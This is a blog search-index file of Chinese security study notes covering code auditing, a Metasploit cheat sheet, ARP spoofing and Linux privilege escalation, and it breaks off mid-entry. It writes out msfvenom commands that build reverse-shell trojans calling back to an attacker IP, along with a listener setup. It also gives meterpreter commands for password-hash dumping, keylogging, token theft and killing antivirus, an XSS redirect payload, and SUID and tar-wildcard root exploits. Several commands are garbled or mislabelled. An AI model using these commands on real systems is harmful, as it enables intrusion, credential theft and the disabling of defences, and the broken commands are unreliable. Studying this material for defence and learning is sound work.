<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>代码审计</title>
    <link href="/2024/10/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/10/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h3 id="什么是代码审计"><a href="#什么是代码审计" class="headerlink" title="什么是代码审计"></a>什么是代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">由具备丰富的编码经验并对安全编码及应用安全具有很深刻理解的安全服务人员根据一定的编码规范和标准,针对应用程序源代码,从结构、脆弱性以及缺陷等方面进行审查,最终输出代码审计报告,完善应用程序,提升自身安全水平怎么做代码审计?(从发现安全漏洞维度出发)<br>具备哪些知识点(运行环境搭建、熟悉开发语言、各类函数应用)<br>了解常用漏洞产生成因(SQL、xss、上传漏洞、SSRF、代码执行、CSRF等等)漏洞调试(断点输出、变量跟踪、漏洞关键函数)<br>高级应用漏洞<span class="hljs-comment">// (奇技淫巧应用:二次注入、截断注入、条件竞争、二次攻击、黑白盒fuzz等)</span><br>Poc编写(数据包构造、语言类型)<br></code></pre></td></tr></table></figure><h3 id="能力"><a href="#能力" class="headerlink" title="能力"></a>能力</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">联想能力<br>开发能力<br><span class="hljs-comment">// 寻找答案的能力</span><br><span class="hljs-comment">// 抓住重点的能力,能够忽略无效信息</span><br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">代码审计有<span class="hljs-number">2</span>种大体思路<br><span class="hljs-number">1</span>.直接通过扫描器扫描出来敏感的函数,然后逆推<br><span class="hljs-number">2</span>.访问网站,然后根据网站的结构推测可能出现的问题<br>  <br><span class="hljs-number">1</span>.快速定位 <span class="hljs-comment">// 黑（黑盒测试）加白（白盒测试）</span><br>      （功能点）    （对应源代码）<br><span class="hljs-number">2</span>. 白盒审计 <span class="hljs-comment">//(查找敏感函数 insert select scriptcurl exec move upload file system)</span><br>    （浪费时间，有一定收获）<br><span class="hljs-number">3</span>. 通读全文 （全部都看，时间耗时长，但能发现<span class="hljs-number">90</span>%的<span class="hljs-number">0</span>day）<br></code></pre></td></tr></table></figure><h4 id="zzcmsxss漏洞"><a href="#zzcmsxss漏洞" class="headerlink" title="zzcmsxss漏洞"></a>zzcmsxss漏洞</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;img+src=<span class="hljs-string">&quot;x&quot;</span>+onerror=location.href=`https:<span class="hljs-comment">//www.baidu.com`&gt;</span><br>              <span class="hljs-comment">// 错误则跳转</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全技术</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MSF操作指令</title>
    <link href="/2024/06/14/MSF%E6%93%8D%E4%BD%9C%E6%8C%87%E4%BB%A4/"/>
    <url>/2024/06/14/MSF%E6%93%8D%E4%BD%9C%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="MSF操作指令"><a href="#MSF操作指令" class="headerlink" title="MSF操作指令"></a>MSF操作指令</h2><h3 id="上线前"><a href="#上线前" class="headerlink" title="上线前"></a>上线前</h3><h4 id="msf命令大全"><a href="#msf命令大全" class="headerlink" title="msf命令大全"></a>msf命令大全</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php">以下是msfconsole命令的完整列表：<br><br><span class="hljs-comment">#核心命令</span><br>help                        显示所有可用的命令<br>search                      在exploit库中搜索exploit、auxiliary、post、encoder和NOP <br> <span class="hljs-comment">// 例如 search ms17</span><br>generator<br>info                        显示有关一个模块的详细信息<br><span class="hljs-keyword">use</span>                         选择并加载一个模块<br><span class="hljs-title">back</span>                        退出当前模块<br><span class="hljs-title">exit</span>                        退出<span class="hljs-title">msfconsole</span><br><br>#会话命令<br><span class="hljs-title">sessions</span>                    显示所有会话<br><span class="hljs-title">sessions</span> -<span class="hljs-title">i</span> [<span class="hljs-title">session</span> <span class="hljs-title">ID</span>]     与一个会话进行交互<br><span class="hljs-title">sessions</span> -<span class="hljs-title">K</span> [<span class="hljs-title">session</span> <span class="hljs-title">ID</span>]     终止一个会话<br><span class="hljs-title">sessions</span> -<span class="hljs-title">u</span> [<span class="hljs-title">session</span> <span class="hljs-title">ID</span>]     卸载一个模块<br><br>#数据存储命令<br><span class="hljs-title">db_nmap</span>                     使用<span class="hljs-title">nmap</span>进行扫描并将结果保存到数据库<br><span class="hljs-title">db_import</span>                   从文件中导入扫描结果到数据库<br><span class="hljs-title">db_export</span>                   将扫描结果导出到文件<br><span class="hljs-title">creds</span>                       显示凭据信息<br><span class="hljs-title">vulns</span>                       显示漏洞信息<br><br>#漏洞利用命令<br><span class="hljs-title">exploit</span>                     运行<span class="hljs-title">Payload</span>以利用目标系统<br><span class="hljs-title">set</span>                         设置<span class="hljs-title">Payload</span>的选项<br><span class="hljs-title">show</span>                        显示当前模块的选项<br><span class="hljs-title">unset</span>                       取消设置某个选项<br><span class="hljs-title">check</span>                       检查目标系统是否存在漏洞<br><span class="hljs-title">run</span>                         运行当前模块<br><br>#辅助工具命令<br><span class="hljs-title">banner</span>                      显示<span class="hljs-title">MSF</span>的<span class="hljs-title">logo</span>信息<br><span class="hljs-title">color</span>                       切换控制台颜色<br><span class="hljs-title">history</span>                     显示当前控制台中执行的命令列表<br><span class="hljs-title">sleep</span>                       控制台暂停<br><span class="hljs-title">version</span>                     显示<span class="hljs-title">MSF</span>的版本信息<br><span class="hljs-title">reload_all</span>                  重新加载所有模块和插件<br><span class="hljs-title">unload_all</span>                  卸载所有模块和插件<br><br>#多模块管理命令<br><span class="hljs-title">workspace</span>                   显示当前工作区<br><span class="hljs-title">workspace</span> -<span class="hljs-title">a</span> [<span class="hljs-title">name</span>]         添加一个新的工作区<br><span class="hljs-title">workspace</span> -<span class="hljs-title">d</span> [<span class="hljs-title">name</span>]         删除一个工作区<br><span class="hljs-title">workspace</span> [<span class="hljs-title">name</span>]            切换到一个工作区<br><span class="hljs-title">hosts</span>                       显示当前工作区中的主机列表<br><span class="hljs-title">services</span>                    显示当前工作区中的服务列表<br><span class="hljs-title">creds</span>                       显示当前工作区中的凭证列表<br><span class="hljs-title">vulns</span>                       显示当前工作区中的漏洞列表<br><br>#插件命令<br><span class="hljs-title">load</span>                        加载指定的插件<br><span class="hljs-title">unload</span>                      卸载指定的插件<br><span class="hljs-title">reload</span>                      重新加载指定的插件<br></code></pre></td></tr></table></figure><h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><p>–msfvenom模块</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// =========================系统木马=======================</span><br><span class="hljs-comment">#正向Linux:</span><br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> LPORT=<span class="hljs-number">7668</span> -f elf &gt; luojunyi.elf<br><span class="hljs-comment">#反向Linux:</span><br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> LPORT=<span class="hljs-number">8008</span> -f elf &gt; shell.elf<br>windows:<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> LPORT=<span class="hljs-number">3333</span> -f exe &gt; shell.exe<br>Mac:<br>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f macho &gt; shell.macho<br>Android:<br>msfvenom -p android/meterpreter/reverse_tcp lhost=[你的IP] port=[端口] -<span class="hljs-number">0</span> 保存路径/文件名.apk<br><span class="hljs-comment">//    ================编程语言==================</span><br>PHP :<br>msfvenom -p php/meterpreter-reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Portto Connect on&gt; -f raw &gt; she11.php<br>cat she11.php l pbcopy &amp;&amp; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;?php &#x27;</span>  tr -d <span class="hljs-string">&#x27;n&#x27;</span> &gt; shel1.php &amp;&amp; pbpaste &gt;&gt;she17.php<br></code></pre></td></tr></table></figure><h4 id="查看msf命令"><a href="#查看msf命令" class="headerlink" title="查看msf命令"></a>查看msf命令</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">msf  <span class="hljs-comment">// 按TAB  查看命令</span><br></code></pre></td></tr></table></figure><h4 id="打开msf命令"><a href="#打开msf命令" class="headerlink" title="打开msf命令"></a>打开msf命令</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">msfconsole<br><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">multi</span>/<span class="hljs-title">handler</span>   //<span class="hljs-title">use</span> 监听模块<br><span class="hljs-title">set</span> <span class="hljs-title">lhost</span> 192.168.234.133<br><span class="hljs-title">set</span> <span class="hljs-title">lport</span> 3333       <br><span class="hljs-title">set</span> <span class="hljs-title">PAYLOAD</span> <span class="hljs-title">windows</span>/<span class="hljs-title">meterpreter</span>/<span class="hljs-title">reverse_tcp</span>  //设置<span class="hljs-title">payload</span><br><span class="hljs-title">show</span> <span class="hljs-title">options</span>   // 查看配置<br><span class="hljs-title">run</span>      //开启<br><span class="hljs-title">exit</span>   //退出<br></code></pre></td></tr></table></figure><h4 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">netstat -ntlp  <span class="hljs-comment">//查看端口开发情况</span><br></code></pre></td></tr></table></figure><h4 id="payload搜索与使用"><a href="#payload搜索与使用" class="headerlink" title="payload搜索与使用"></a>payload搜索与使用</h4><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">search</span> <span class="hljs-symbol">ms0170</span><br></code></pre></td></tr></table></figure><h3 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php">meterpreter &gt; background 返回后台<br>meterpreter &gt; <span class="hljs-keyword">exit</span> 关闭会话<br>meterpreter &gt; help 帮助信息<br>meterpreter &gt; sysinfo 系统平台信息<br>getuidmeterpreter &gt;screenshot 屏幕截取<br>meterpreter &gt;meterpreter &gt; she11 命令行<span class="hljs-title function_ invoke__">she1</span> (<span class="hljs-keyword">exit</span>退出)<br><br>meterpreter &gt; getlwd 查看本地目录<br>meterpreter &gt; lcd 切换本地目录<br>meterpreter &gt; getwd 查看目录<br>meterpreter &gt; ls 查看文件目录列表<br>meterpreter &gt; cd 切换目录<br>meterpreter &gt; rm 删除文件<br>meterpreter &gt; download C:\\users\\<span class="hljs-number">123</span>\\Desktop\\<span class="hljs-number">1</span>.txt <span class="hljs-number">1</span>.txt下载文件<br>meterpreter &gt; upload /<span class="hljs-keyword">var</span>/www/wce.exe wce.exe   <span class="hljs-comment">//  上传文件</span><br>meterpreter &gt; search -d c: -f *.doc搜索文件<br>meterpreter &gt; execute -f cmd.exe -i 执行程序/命令<br>meterpreter &gt; ps查看进程<br>meterpreter &gt; run post/windows /capture/key1og_ recorder 键盘记录<br>meterpreter &gt; getuid查看当前用户权限<br>meterpreter &gt; <span class="hljs-keyword">use</span> <span class="hljs-title">priv</span>加载特权模块<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">getsystem</span> 提升到<span class="hljs-title">SYSTEM</span>权限<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">hashdump</span>导出密码散列<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">ps</span>查看高权限用户<span class="hljs-title">PID</span><br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">steal</span> <span class="hljs-title">token</span> &lt;<span class="hljs-title">PID</span>&gt; 窃取令牌<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">rev2self</span> 恢复原来的令牌<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">migrate</span> <span class="hljs-title">pid</span> 迁移进程<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">killav</span> 关闭杀毒软件<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">getgui</span>-<span class="hljs-title">e</span> 启用远程桌面<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">portfwd</span> <span class="hljs-title">add</span> -<span class="hljs-title">l</span> 1234 -<span class="hljs-title">p</span> 3389 -<span class="hljs-title">r</span> &lt;目标<span class="hljs-title">IP</span>&gt; 端口转发<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">get_local_subnets</span> 获取内网网段信息<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">autoroute</span> -<span class="hljs-title">s</span> &lt;内网网段&gt;创建自动路由<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">autoroute</span> -<span class="hljs-title">p</span> 查看自动路由表<br><br>创建代理通道:<br><span class="hljs-title">msf</span> &gt; <span class="hljs-title">use</span> <span class="hljs-title">auxiliary</span>/<span class="hljs-title">server</span>/<span class="hljs-title">socks4a</span> 设置<span class="hljs-title">socks4</span>代理模块<br><span class="hljs-title">msf</span> <span class="hljs-title">auxiliary</span>(<span class="hljs-title">socks4a</span>) &gt; <span class="hljs-title">show</span> <span class="hljs-title">opti</span> <span class="hljs-title">ons</span><br><span class="hljs-title">msf</span> <span class="hljs-title">auxiliary</span>(<span class="hljs-title">socks4a</span>) &gt; <span class="hljs-title">run</span><br>配 置<span class="hljs-title">proxychains</span>参数:<br><span class="hljs-title">nano</span> /<span class="hljs-title">etc</span>/<span class="hljs-title">prcxychains</span>.<span class="hljs-title">conf</span>修改代理监听端口，和前面端口一致<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全技术</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arp与dns与ddos</title>
    <link href="/2024/03/14/arp%E4%B8%8Edns%E4%B8%8Eddos/"/>
    <url>/2024/03/14/arp%E4%B8%8Edns%E4%B8%8Eddos/</url>
    
    <content type="html"><![CDATA[<h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 应急响应: 服务器被入侵了，并且被客户发现了，现在需要你去恢复资料或者清理后门</span><br><span class="hljs-number">1</span>.梳理黑客的攻击路线<br><span class="hljs-number">2</span>.清理后门<br><span class="hljs-number">3</span>.流量监测<br><span class="hljs-number">4</span>.安全加固<br><span class="hljs-number">5</span>.应急响应事件文档<br></code></pre></td></tr></table></figure><h4 id="APT攻击"><a href="#APT攻击" class="headerlink" title="APT攻击"></a>APT攻击</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment"># APT攻击 即高级可持续威胁攻击</span><br></code></pre></td></tr></table></figure><h4 id="kali安装apr"><a href="#kali安装apr" class="headerlink" title="kali安装apr"></a>kali安装apr</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">vim /etc/apt/sources.<span class="hljs-keyword">list</span><br><br>deb https:<span class="hljs-comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br>deb-src https:<span class="hljs-comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><br>apt-get update<br>apt-get install dsniff<br></code></pre></td></tr></table></figure><h4 id="APR欺骗攻击"><a href="#APR欺骗攻击" class="headerlink" title="APR欺骗攻击"></a>APR欺骗攻击</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#  ARP欺骗 =&gt; 中间人劫持攻击</span><br><br>ARP协议是“Address Resolution Protocol”(地址解析协议)的缩写。我们知道在局域网中，网络以“帧”的形式传输数据。一个主机要和另一个主机进行直接通信，必须要知道目标主机的MAC地址，目标主机的MAC地址理应就包含在数据帧中。显然在双方通信之初，发送方是无法知道目标MAC地址的，它的获得就是通过地址解析这个过程。所谓”“地址解析”就是主机在发送前将目标IP地址转换成目标MAC地址的过程。ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进<br>  <br><span class="hljs-number">1</span>.免费ARP<br><span class="hljs-number">2</span>.标准ARP<br><span class="hljs-number">3</span>.代理ARP<br>  <br><span class="hljs-number">1</span>.免费ARP:<br>sip <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span> smac xx-xx-xx-xx<br>dip <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span> dmac FF-FF-FF-<span class="hljs-title function_ invoke__">FF</span>(广播地址)<br>  <br>  <br><br>  <br>  <br><span class="hljs-comment"># ARP协议 漏洞:</span><br>未进行鉴权行为<br>谁发我都收 收了即更新<br></code></pre></td></tr></table></figure><h4 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h4><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">```<br><br>#### DDOS防御<br><br>```php<br><span class="hljs-number">1</span>.增加带宽( 专线)<br><span class="hljs-number">2</span>.流量清洗(防火墙流量池)<br><span class="hljs-number">3</span>.cdn(云盾) 清洗功能  =&gt;  <span class="hljs-number">6000</span><br>DDOS就是比谁钱多<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全技术</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>权限提升linux</title>
    <link href="/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83linux/"/>
    <url>/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83linux/</url>
    
    <content type="html"><![CDATA[<h3 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h3><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">先信息收集，收集系统信息，EXP信息，IP</span><span class="hljs-string">,</span><span class="hljs-comment">端口。</span><br><span class="hljs-comment">信息收集</span><br><span class="hljs-comment">系统自带规则</span><span class="hljs-literal">--</span><span class="hljs-comment">SUID</span><br><span class="hljs-comment">漏洞提权一一通过第一步的信息收集</span><br><span class="hljs-comment">其他的不安全配置</span><br><span class="hljs-comment">环境变量配合SUID</span><br><span class="hljs-comment">定时任务提权</span><br><span class="hljs-literal">---</span><span class="hljs-comment">tar 压缩配置不安全</span><br><span class="hljs-comment">1</span><span class="hljs-string">.</span><span class="hljs-comment">怎么出现的/出现的场景</span> <span class="hljs-literal">---</span> <span class="hljs-comment">定时任务，定时运行的脚本中。存在tar压缩配置不安全。这种脚本常见于运维定时备份2</span><span class="hljs-string">.</span><span class="hljs-comment">原理/(根据原理)怎么利用的</span><br><span class="hljs-literal">---</span> <span class="hljs-comment">利用的tar中需要压缩所有文件 在压缩命令末尾处存在* 号通配符匹配所有文件</span><br><span class="hljs-literal">--</span> <span class="hljs-comment">创建tar相应的以命令参数命名的文件，以及利用(命令参数执行利用) A脚本(我们自己写的</span><br><span class="hljs-comment">3</span><span class="hljs-string">.</span> <span class="hljs-comment">cp /bin/bash /tmp/aaa/bash; chmod</span> <span class="hljs-literal">+</span><span class="hljs-comment">s /tmp/bash</span><br><span class="hljs-comment">SUID</span><br><span class="hljs-comment">4</span><span class="hljs-string">.</span><span class="hljs-comment">dhmod</span> <span class="hljs-literal">+</span><span class="hljs-comment">s /user/bin/find</span><br><span class="hljs-comment">5</span><span class="hljs-string">.</span><span class="hljs-comment">反弹shell</span><span class="hljs-literal">--</span><span class="hljs-comment">nc下载木马 wget:</span> <span class="hljs-literal">----</span> <span class="hljs-comment">执行</span><br><span class="hljs-literal">-</span><span class="hljs-comment">文件权限配置不安全</span><br></code></pre></td></tr></table></figure><h5 id="往上滑"><a href="#往上滑" class="headerlink" title="往上滑"></a>往上滑</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// Shift+PgUppause</span><br></code></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">curl ifconfig.me 可见自己IP<br><br>*一个综合类探针: https:<span class="hljs-comment">//github.com/liamg/traitor (上传后直接运行即可)</span><br>个自动化提权: https:<span class="hljs-comment">//github.com/Alessandroz/BeRoot(需要py环境)</span><br>*信息收集: https:<span class="hljs-comment">//github.com/rebootuser/LinEnum(出系统信息)</span><br>*信息收集: https:<span class="hljs-comment">//github.com/mzdt-/linux-exploit-suggester (出EXP信息)</span><br>漏洞探针: https:<span class="hljs-comment">//github.com/sleventyeleven/inuxprivchecker(需要py环境)</span><br>*漏洞探针: https:<span class="hljs-comment">//github,com/jondonas/1inux-exploit-suggester-2</span><br>进制文件提权查询:<br>Linux: https:<span class="hljs-comment">//gtfobins.github.io/</span><br>windows:https:<span class="hljs-comment">//1o1bas-project.github.io/</span><br>set payload php/meter--/reverse--<br></code></pre></td></tr></table></figure><h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 原理是什么?</span><br><span class="hljs-title function_ invoke__">SUID</span> (set User ID) 是一种特殊的权限设置，<br>用于在执行程序时将有效用户<span class="hljs-title function_ invoke__">ID</span> (UID) 临时更改为程序文件所有者的UID<br><br>root suid-&gt;find<br><br><span class="hljs-title function_ invoke__">boy</span> (运维人员) <span class="hljs-title function_ invoke__">find</span> (root)<br><br><span class="hljs-comment">// 漏洞成因: chmod u+s给予了suid u-s删除了suid</span><br>如: chmod u+s find<br>使程序在运行中受到了suid root权限的执行过程导致<br><br><span class="hljs-comment">// 提权过程: 探针是否有SUID(手工或脚本)-特定SUID利用-</span><br></code></pre></td></tr></table></figure><h4 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h4><h6 id="手工"><a href="#手工" class="headerlink" title="手工"></a>手工</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 手工命令探针安全:</span><br>find / -user root -perm -<span class="hljs-number">4000</span> -<span class="hljs-keyword">print</span> <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span><br>find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span><br>find / -user root -perm -<span class="hljs-number">4000</span> -exec <span class="hljs-number">1</span>s -<span class="hljs-number">1</span>db &#123;&#125; \;<br></code></pre></td></tr></table></figure><h6 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 脚本项目探针安全:</span><br>LinEnum.sh traitor Tinuxprivchecker<br></code></pre></td></tr></table></figure><h4 id="suid利用"><a href="#suid利用" class="headerlink" title="suid利用"></a>suid利用</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 参考利用：</span><br>https:<span class="hljs-comment">//gtfobins.github.io/</span><br>https:<span 